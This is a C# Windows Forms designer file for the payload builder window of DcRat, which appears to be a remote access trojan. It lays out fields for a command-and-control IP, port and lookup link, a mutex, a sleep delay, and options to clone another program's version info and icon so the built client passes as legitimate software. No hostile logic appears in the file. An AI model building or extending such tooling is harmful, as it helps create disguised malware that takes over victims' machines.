
using System.ComponentModel;
using System.Windows.Forms;
using DcRat.Controls;

namespace DcRat.ChildForms
{
    partial class childFormBuilder
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(childFormBuilder));
            this.panelbuilderback = new System.Windows.Forms.Panel();
            this.panel1 = new System.Windows.Forms.Panel();
            this.groupBoxothers = new System.Windows.Forms.GroupBox();
            this.radioButtonnet35 = new System.Windows.Forms.RadioButton();
            this.radioButtonnet40 = new System.Windows.Forms.RadioButton();
            this.buttonbuild = new System.Windows.Forms.Button();
            this.numericUpDownsleep = new System.Windows.Forms.NumericUpDown();
            this.labelsleep = new System.Windows.Forms.Label();
            this.labelmutex = new System.Windows.Forms.Label();
            this.textBoxmutex = new System.Windows.Forms.TextBox();
            this.labelgroup = new System.Windows.Forms.Label();
            this.textBoxgroup = new System.Windows.Forms.TextBox();
            this.groupBoxassembly = new System.Windows.Forms.GroupBox();
            this.buttonchoose = new System.Windows.Forms.Button();
            this.buttonclone = new System.Windows.Forms.Button();
            this.labeltrademarks = new System.Windows.Forms.Label();
            this.labelfileversion = new System.Windows.Forms.Label();
            this.labelcopyright = new System.Windows.Forms.Label();
            this.labelproductversion = new System.Windows.Forms.Label();
            this.labeloriginalfilename = new System.Windows.Forms.Label();
            this.labelcompany = new System.Windows.Forms.Label();
            this.labeldescription = new System.Windows.Forms.Label();
            this.labelproduct = new System.Windows.Forms.Label();
            this.textBoxfileversion = new System.Windows.Forms.TextBox();
            this.textBoxoriginalfilename = new System.Windows.Forms.TextBox();
            this.textBoxproduct = new System.Windows.Forms.TextBox();
            this.textBoxdescription = new System.Windows.Forms.TextBox();
            this.textBoxproductversion = new System.Windows.Forms.TextBox();
            this.textBoxtrademarks = new System.Windows.Forms.TextBox();
            this.textBoxcopyright = new System.Windows.Forms.TextBox();
            this.textBoxcompany = new System.Windows.Forms.TextBox();
            this.toggleButtonassembly = new DcRat.Controls.ToggleButton();
            this.textBoxicon = new System.Windows.Forms.TextBox();
            this.pictureBoxicon = new System.Windows.Forms.PictureBox();
            this.toggleButtonicon = new DcRat.Controls.ToggleButton();
            this.labelassembly = new System.Windows.Forms.Label();
            this.labelicon = new System.Windows.Forms.Label();
            this.groupBoxipport = new System.Windows.Forms.GroupBox();
            this.labellink = new System.Windows.Forms.Label();
            this.toggleButtonip = new DcRat.Controls.ToggleButton();
            this.textBoxlink = new System.Windows.Forms.TextBox();
            this.textBoxip = new System.Windows.Forms.TextBox();
            this.labelport = new System.Windows.Forms.Label();
            this.textBoxport = new System.Windows.Forms.TextBox();
            this.labelgetipbylink = new System.Windows.Forms.Label();
            this.labelip = new System.Windows.Forms.Label();
            this.updateUI = new System.Windows.Forms.Timer(this.components);
            this.panelbuilderback.SuspendLayout();
            this.panel1.SuspendLayout();
            this.groupBoxothers.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownsleep)).BeginInit();
            this.groupBoxassembly.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxicon)).BeginInit();
            this.groupBoxipport.SuspendLayout();
            this.SuspendLayout();
            // 
            // panelbuilderback
            // 
            resources.ApplyResources(this.panelbuilderback, "panelbuilderback");
            this.panelbuilderback.Controls.Add(this.panel1);
            this.panelbuilderback.Name = "panelbuilderback";
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.groupBoxothers);
            this.panel1.Controls.Add(this.groupBoxassembly);
            this.panel1.Controls.Add(this.groupBoxipport);
            resources.ApplyResources(this.panel1, "panel1");
            this.panel1.Name = "panel1";
            // 
            // groupBoxothers
            // 
            resources.ApplyResources(this.groupBoxothers, "groupBoxothers");
            this.groupBoxothers.Controls.Add(this.radioButtonnet35);
            this.groupBoxothers.Controls.Add(this.radioButtonnet40);
            this.groupBoxothers.Controls.Add(this.buttonbuild);
            this.groupBoxothers.Controls.Add(this.numericUpDownsleep);
            this.groupBoxothers.Controls.Add(this.labelsleep);
            this.groupBoxothers.Controls.Add(this.labelmutex);
            this.groupBoxothers.Controls.Add(this.textBoxmutex);
            this.groupBoxothers.Controls.Add(this.labelgroup);
            this.groupBoxothers.Controls.Add(this.textBoxgroup);
            this.groupBoxothers.Name = "groupBoxothers";
            this.groupBoxothers.TabStop = false;
            // 
            // radioButtonnet35
            // 
            resources.ApplyResources(this.radioButtonnet35, "radioButtonnet35");
            this.radioButtonnet35.Name = "radioButtonnet35";
            this.radioButtonnet35.UseVisualStyleBackColor = true;
            // 
            // radioButtonnet40
            // 
            resources.ApplyResources(this.radioButtonnet40, "radioButtonnet40");
            this.radioButtonnet40.Checked = true;
            this.radioButtonnet40.Name = "radioButtonnet40";
            this.radioButtonnet40.TabStop = true;
            this.radioButtonnet40.UseVisualStyleBackColor = true;
            // 
            // buttonbuild
            // 
            resources.ApplyResources(this.buttonbuild, "buttonbuild");
            this.buttonbuild.Name = "buttonbuild";
            this.buttonbuild.UseVisualStyleBackColor = true;
            this.buttonbuild.Click += new System.EventHandler(this.buttonbuild_Click);
            // 
            // numericUpDownsleep
            // 
            resources.ApplyResources(this.numericUpDownsleep, "numericUpDownsleep");
            this.numericUpDownsleep.Name = "numericUpDownsleep";
            // 
            // labelsleep
            // 
            resources.ApplyResources(this.labelsleep, "labelsleep");
            this.labelsleep.Name = "labelsleep";
            // 
            // labelmutex
            // 
            resources.ApplyResources(this.labelmutex, "labelmutex");
            this.labelmutex.Name = "labelmutex";
            // 
            // textBoxmutex
            // 
            resources.ApplyResources(this.textBoxmutex, "textBoxmutex");
            this.textBoxmutex.Name = "textBoxmutex";
            // 
            // labelgroup
            // 
            resources.ApplyResources(this.labelgroup, "labelgroup");
            this.labelgroup.Name = "labelgroup";
            // 
            // textBoxgroup
            // 
            resources.ApplyResources(this.textBoxgroup, "textBoxgroup");
            this.textBoxgroup.Name = "textBoxgroup";
            // 
            // groupBoxassembly
            // 
            resources.ApplyResources(this.groupBoxassembly, "groupBoxassembly");
            this.groupBoxassembly.Controls.Add(this.buttonchoose);
            this.groupBoxassembly.Controls.Add(this.buttonclone);
            this.groupBoxassembly.Controls.Add(this.labeltrademarks);
            this.groupBoxassembly.Controls.Add(this.labelfileversion);
            this.groupBoxassembly.Controls.Add(this.labelcopyright);
            this.groupBoxassembly.Controls.Add(this.labelproductversion);
            this.groupBoxassembly.Controls.Add(this.labeloriginalfilename);
            this.groupBoxassembly.Controls.Add(this.labelcompany);
            this.groupBoxassembly.Controls.Add(this.labeldescription);
            this.groupBoxassembly.Controls.Add(this.labelproduct);
            this.groupBoxassembly.Controls.Add(this.textBoxfileversion);
            this.groupBoxassembly.Controls.Add(this.textBoxoriginalfilename);
            this.groupBoxassembly.Controls.Add(this.textBoxproduct);
            this.groupBoxassembly.Controls.Add(this.textBoxdescription);
            this.groupBoxassembly.Controls.Add(this.textBoxproductversion);
            this.groupBoxassembly.Controls.Add(this.textBoxtrademarks);
            this.groupBoxassembly.Controls.Add(this.textBoxcopyright);
            this.groupBoxassembly.Controls.Add(this.textBoxcompany);
            this.groupBoxassembly.Controls.Add(this.toggleButtonassembly);
            this.groupBoxassembly.Controls.Add(this.textBoxicon);
            this.groupBoxassembly.Controls.Add(this.pictureBoxicon);
            this.groupBoxassembly.Controls.Add(this.toggleButtonicon);
            this.groupBoxassembly.Controls.Add(this.labelassembly);
            this.groupBoxassembly.Controls.Add(this.labelicon);
            this.groupBoxassembly.Name = "groupBoxassembly";
            this.groupBoxassembly.TabStop = false;
            // 
            // buttonchoose
            // 
            resources.ApplyResources(this.buttonchoose, "buttonchoose");
            this.buttonchoose.Name = "buttonchoose";
            this.buttonchoose.UseVisualStyleBackColor = true;
            this.buttonchoose.Click += new System.EventHandler(this.buttonchoose_Click);
            // 
            // buttonclone
            // 
            resources.ApplyResources(this.buttonclone, "buttonclone");
            this.buttonclone.Name = "buttonclone";
            this.buttonclone.UseVisualStyleBackColor = true;
            this.buttonclone.Click += new System.EventHandler(this.buttonclone_Click);
            // 
            // labeltrademarks
            // 
            resources.ApplyResources(this.labeltrademarks, "labeltrademarks");
            this.labeltrademarks.Name = "labeltrademarks";
            // 
            // labelfileversion
            // 
            resources.ApplyResources(this.labelfileversion, "labelfileversion");
            this.labelfileversion.Name = "labelfileversion";
            // 
            // labelcopyright
            // 
            resources.ApplyResources(this.labelcopyright, "labelcopyright");
            this.labelcopyright.Name = "labelcopyright";
            // 
            // labelproductversion
            // 
            resources.ApplyResources(this.labelproductversion, "labelproductversion");
            this.labelproductversion.Name = "labelproductversion";
            // 
            // labeloriginalfilename
            // 
            resources.ApplyResources(this.labeloriginalfilename, "labeloriginalfilename");
            this.labeloriginalfilename.Name = "labeloriginalfilename";
            // 
            // labelcompany
            // 
            resources.ApplyResources(this.labelcompany, "labelcompany");
            this.labelcompany.Name = "labelcompany";
            // 
            // labeldescription
            // 
            resources.ApplyResources(this.labeldescription, "labeldescription");
            this.labeldescription.Name = "labeldescription";
            // 
            // labelproduct
            // 
            resources.ApplyResources(this.labelproduct, "labelproduct");
            this.labelproduct.Name = "labelproduct";
            // 
            // textBoxfileversion
            // 
            resources.ApplyResources(this.textBoxfileversion, "textBoxfileversion");
            this.textBoxfileversion.Name = "textBoxfileversion";
            // 
            // textBoxoriginalfilename
            // 
            resources.ApplyResources(this.textBoxoriginalfilename, "textBoxoriginalfilename");
            this.textBoxoriginalfilename.Name = "textBoxoriginalfilename";
            // 
            // textBoxproduct
            // 
            resources.ApplyResources(this.textBoxproduct, "textBoxproduct");
            this.textBoxproduct.Name = "textBoxproduct";
            // 
            // textBoxdescription
            // 
            resources.ApplyResources(this.textBoxdescription, "textBoxdescription");
            this.textBoxdescription.Name = "textBoxdescription";
            // 
            // textBoxproductversion
            // 
            resources.ApplyResources(this.textBoxproductversion, "textBoxproductversion");
            this.textBoxproductversion.Name = "textBoxproductversion";
            // 
            // textBoxtrademarks
            // 
            resources.ApplyResources(this.textBoxtrademarks, "textBoxtrademarks");
            this.textBoxtrademarks.Name = "textBoxtrademarks";
            // 
            // textBoxcopyright
            // 
            resources.ApplyResources(this.textBoxcopyright, "textBoxcopyright");
            this.textBoxcopyright.Name = "textBoxcopyright";
            // 
            // textBoxcompany
            // 
            resources.ApplyResources(this.textBoxcompany, "textBoxcompany");
            this.textBoxcompany.Name = "textBoxcompany";
            // 
            // toggleButtonassembly
            // 
            this.toggleButtonassembly.BackColor = System.Drawing.Color.Transparent;
            this.toggleButtonassembly.Checked = false;
            this.toggleButtonassembly.Cursor = System.Windows.Forms.Cursors.Hand;
            resources.ApplyResources(this.toggleButtonassembly, "toggleButtonassembly");
            this.toggleButtonassembly.Name = "toggleButtonassembly";
            this.toggleButtonassembly.MouseClick += new System.Windows.Forms.MouseEventHandler(this.toggleButtonassembly_MouseClick);
            // 
            // textBoxicon
            // 
            resources.ApplyResources(this.textBoxicon, "textBoxicon");
            this.textBoxicon.Name = "textBoxicon";
            // 
            // pictureBoxicon
            // 
            this.pictureBoxicon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            resources.ApplyResources(this.pictureBoxicon, "pictureBoxicon");
            this.pictureBoxicon.Name = "pictureBoxicon";
            this.pictureBoxicon.TabStop = false;
            // 
            // toggleButtonicon
            // 
            this.toggleButtonicon.BackColor = System.Drawing.Color.Transparent;
            this.toggleButtonicon.Checked = false;
            this.toggleButtonicon.Cursor = System.Windows.Forms.Cursors.Hand;
            resources.ApplyResources(this.toggleButtonicon, "toggleButtonicon");
            this.toggleButtonicon.Name = "toggleButtonicon";
            this.toggleButtonicon.MouseClick += new System.Windows.Forms.MouseEventHandler(this.toggleButtonicon_MouseClick);
            // 
            // labelassembly
            // 
            resources.ApplyResources(this.labelassembly, "labelassembly");
            this.labelassembly.Name = "labelassembly";
            // 
            // labelicon
            // 
            resources.ApplyResources(this.labelicon, "labelicon");
            this.labelicon.Name = "labelicon";
            // 
            // groupBoxipport
            // 
            resources.ApplyResources(this.groupBoxipport, "groupBoxipport");
            this.groupBoxipport.Controls.Add(this.labellink);
            this.groupBoxipport.Controls.Add(this.toggleButtonip);
            this.groupBoxipport.Controls.Add(this.textBoxlink);
            this.groupBoxipport.Controls.Add(this.textBoxip);
            this.groupBoxipport.Controls.Add(this.labelport);
            this.groupBoxipport.Controls.Add(this.textBoxport);
            this.groupBoxipport.Controls.Add(this.labelgetipbylink);
            this.groupBoxipport.Controls.Add(this.labelip);
            this.groupBoxipport.Name = "groupBoxipport";
            this.groupBoxipport.TabStop = false;
            // 
            // labellink
            // 
            resources.ApplyResources(this.labellink, "labellink");
            this.labellink.Name = "labellink";
            // 
            // toggleButtonip
            // 
            this.toggleButtonip.BackColor = System.Drawing.Color.Transparent;
            this.toggleButtonip.Checked = false;
            this.toggleButtonip.Cursor = System.Windows.Forms.Cursors.Hand;
            resources.ApplyResources(this.toggleButtonip, "toggleButtonip");
            this.toggleButtonip.Name = "toggleButtonip";
            this.toggleButtonip.MouseClick += new System.Windows.Forms.MouseEventHandler(this.toggleButtonip_MouseClick);
            // 
            // textBoxlink
            // 
            resources.ApplyResources(this.textBoxlink, "textBoxlink");
            this.textBoxlink.Name = "textBoxlink";
            // 
            // textBoxip
            // 
            resources.ApplyResources(this.textBoxip, "textBoxip");
            this.textBoxip.Name = "textBoxip";
            // 
            // labelport
            // 
            resources.ApplyResources(this.labelport, "labelport");
            this.labelport.Name = "labelport";
            // 
            // textBoxport
            // 
            resources.ApplyResources(this.textBoxport, "textBoxport");
            this.textBoxport.Name = "textBoxport";
            // 
            // labelgetipbylink
            // 
            resources.ApplyResources(this.labelgetipbylink, "labelgetipbylink");
            this.labelgetipbylink.Name = "labelgetipbylink";
            // 
            // labelip
            // 
            resources.ApplyResources(this.labelip, "labelip");
            this.labelip.Name = "labelip";
            // 
            // updateUI
            // 
            this.updateUI.Enabled = true;
            this.updateUI.Interval = 1000;
            this.updateUI.Tick += new System.EventHandler(this.updateUI_Tick);
            // 
            // childFormBuilder
            // 
            resources.ApplyResources(this, "$this");
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.Controls.Add(this.panelbuilderback);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "childFormBuilder";
            this.ShowInTaskbar = false;
            this.panelbuilderback.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.groupBoxothers.ResumeLayout(false);
            this.groupBoxothers.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownsleep)).EndInit();
            this.groupBoxassembly.ResumeLayout(false);
            this.groupBoxassembly.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxicon)).EndInit();
            this.groupBoxipport.ResumeLayout(false);
            this.groupBoxipport.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private Panel panelbuilderback;
        private Panel panel1;
        private GroupBox groupBoxipport;
        private TextBox textBoxip;
        private Label labelport;
        private TextBox textBoxport;
        private Label labelip;
        private ToggleButton toggleButtonip;
        private TextBox textBoxlink;
        private Label labelgetipbylink;
        private Label labellink;
        private GroupBox groupBoxassembly;
        private ToggleButton toggleButtonicon;
        private Label labelicon;
        private TextBox textBoxicon;
        private PictureBox pictureBoxicon;
        private Label labelassembly;
        private TextBox textBoxcompany;
        private ToggleButton toggleButtonassembly;
        private Label labeltrademarks;
        private Label labelfileversion;
        private Label labelcopyright;
        private Label labelproductversion;
        private Label labeloriginalfilename;
        private Label labelcompany;
        private Label labeldescription;
        private Label labelproduct;
        private TextBox textBoxfileversion;
        private TextBox textBoxoriginalfilename;
        private TextBox textBoxproduct;
        private TextBox textBoxdescription;
        private TextBox textBoxproductversion;
        private TextBox textBoxtrademarks;
        private TextBox textBoxcopyright;
        private Button buttonclone;
        private Timer updateUI;
        private Button buttonchoose;
        private GroupBox groupBoxothers;
        private Label labelgroup;
        private TextBox textBoxgroup;
        private Button buttonbuild;
        private NumericUpDown numericUpDownsleep;
        private Label labelsleep;
        private Label labelmutex;
        private TextBox textBoxmutex;
        private RadioButton radioButtonnet35;
        private RadioButton radioButtonnet40;
    }
}